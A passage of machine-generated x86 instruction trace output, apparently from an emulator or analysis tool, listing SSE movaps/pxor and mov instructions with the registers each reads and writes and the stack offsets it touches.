0 16 0x425fdd: pxor xmm6, xmm2, regs_read: [128, 124], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x425fea: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x425fed: movaps xmmword ptr [ebp - 0x140], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x425ff8: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x426003: movaps xmmword ptr [ebp - 0x2a0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7d60 for stack size 0x10000 saving data to stack: 0 16 0x42600a: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42600e: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42601f: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x426022: pxor xmm0, xmmword ptr [ebp - 0x100], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x42602a: movaps xmmword ptr [ebp - 0x290], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 saving data to stack: 0 16 0x426031: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426042: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x426049: movaps xmm2, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x426058: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426065: movaps xmmword ptr [ebp - 0xa0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x42606c: pxor xmm7, xmm2, regs_read: [129, 124], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426079: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x42607c: movaps xmmword ptr [ebp - 0x280], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7d80 for stack size 0x10000 saving data to stack: 0 16 0x426087: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x426092: movaps xmmword ptr [ebp - 0x1f0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x426099: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42609d: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x4260ae: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4260b1: pxor xmm0, xmmword ptr [ebp - 0x110], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x4260b9: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4260ca: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4260d1: movaps xmm2, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x4260e0: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4260ed: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x4260f4: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x4260f7: movaps xmmword ptr [ebp - 0x1e0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x426102: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x426105: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426109: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x42611a: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426127: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x426132: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x426135: pxor xmm0, xmmword ptr [ebp - 0xb0], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x42613d: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42614e: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x426155: movaps xmm2, xmm6, regs_read: [128], regs_write: [124] 0x426158: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42616d: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x426174: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x42617c: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x42617f: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426183: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426194: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42619b: movaps xmm1, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 0x42619f: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4261ac: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x4261af: movaps xmmword ptr [ebp - 0x80], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x4261b7: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4261ba: pxor xmm0, xmm6, regs_read: [122, 128], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4261be: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4261cf: movaps xmm0, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 0x4261d3: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x4261da: movaps xmm2, xmm7, regs_read: [129], regs_write: [124] 0x4261e5: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4261f2: movaps xmmword ptr [ebp - 0x1d0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x4261f9: movaps xmm4, xmmword ptr [ebp - 0x140], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x426200: movaps xmmword ptr [ebp - 0x80], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x426204: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426215: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x42621c: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x42621f: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426227: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426238: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x42623b: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42623f: movaps xmmword ptr [ebp - 0x100], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x426246: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426257: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42625e: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426262: movaps xmmword ptr [ebp - 0xe0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x426272: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x426275: movaps xmmword ptr [ebp - 0x140], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x426280: movaps xmmword ptr [ebp - 0x130], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x426287: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42628b: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42629c: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x4262a3: movaps xmm2, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x4262b2: movaps xmm6, xmmword ptr [ebp - 0x280], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7d80 for stack size 0x10000 0x4262b9: movaps xmm7, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x4262c0: pxor xmm6, xmm2, regs_read: [128, 124], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4262cd: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x4262d8: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4262db: pxor xmm0, xmmword ptr [ebp - 0xb0], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x4262e3: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4262f4: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4262fb: movaps xmm2, xmmword ptr [ebp - 0x290], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 0x42630a: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42630e: movaps xmmword ptr [ebp - 0xf0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x426315: pxor xmm7, xmm2, regs_read: [129, 124], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42632b: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x426332: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x42633d: movaps xmmword ptr [ebp - 0x90], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x426344: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426348: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426359: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x42635c: pxor xmm0, xmmword ptr [ebp - 0x290], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 0x426364: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42636b: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42637c: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x426383: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x42638a: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426397: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42639e: movaps xmmword ptr [ebp - 0xa0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x4263a5: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4263a9: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4263ba: movaps xmmword ptr [ebp - 0xd0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x4263ca: movaps xmm5, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x4263d9: movaps xmm4, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x4263e0: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x4263eb: movaps xmm1, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x4263f2: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x4263fd: movaps xmm0, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x42640c: mov edx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x42640f: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x426412: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x42641d: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x426433: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426445: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x426448: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x42644f: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42645d: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x426464: movaps xmm4, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x42646b: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42647d: mov edx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x426480: movaps xmm1, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x426487: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x426492: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426496: movaps xmm0, xmmword ptr [ebp - 0x270], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 0x4264a8: mov edx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x4264ab: movaps xmm5, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x4264be: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x4264c9: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x4264e0: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4264ef: mov edx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x4264f6: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x4264f9: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426508: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x42650f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42651e: mov edx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x426521: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426528: movaps xmm5, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x42653a: movaps xmm4, xmmword ptr [ebp - 0x240], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x426541: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x42654c: movaps xmm1, xmmword ptr [ebp - 0x260], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 0x426553: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x42655e: movaps xmm0, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 0x42656d: mov edx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x426578: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x42658f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42659b: mov dword ptr [ebp - 0x5c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x4265a1: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x4265a4: movaps xmm2, xmmword ptr [ebp - 0x150], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x4265ab: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x4265ae: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4265b9: mov ecx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x4265c4: movaps xmm4, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x4265d9: movaps xmmword ptr [ebp - 0x150], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x4265e0: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4265e4: mov dword ptr [ebp - 0x58], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x4265eb: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x4265f4: mov edx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x4265fa: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x4265fd: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x426600: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426604: movaps xmm0, xmmword ptr [ebp - 0x230], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x426613: mov edx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x426616: movaps xmm5, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 0x42662c: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x42663b: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x426642: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x42664d: mov dword ptr [ebp - 0x5c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x426654: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426660: mov dword ptr [ebp - 0x54], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x426666: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x426669: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426674: mov ecx, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x42667a: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42667e: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x426681: movaps xmm2, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x426688: movaps xmm3, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x42668f: movaps xmm6, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x426696: movaps xmm7, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x4266a0: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x4266a6: mov edx, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x4266a9: movaps xmm1, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x4266ba: movaps xmm4, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x4266c1: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4266c8: mov ecx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x4266cb: movaps xmm5, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x426709: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x42670c: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x42670f: mov dword ptr [ebp - 0x70], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x426712: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x42671f: movaps xmm1, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x426726: movaps xmm2, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x42672d: movaps xmm3, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x426734: movaps xmm4, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x42673b: movaps xmm5, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x426742: movaps xmm6, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x426749: movaps xmm7, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x42675c: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x42675f: mov dword ptr [ebp - 0x64], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x426762: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x426772: mov ecx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x42677f: mov ecx, 0xa, regs_read: (), regs_write: [22] 0x426784: movaps xmm6, xmm7, regs_read: [129], regs_write: [128] 0x42678e: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4267a3: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x4267aa: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4267b7: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x4267be: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4267c1: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4267c5: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4267d2: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4267d6: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x4267dd: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4267ef: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x426800: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x426803: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x426807: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x426814: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42681c: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42682d: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x426830: pxor xmm0, xmm1, 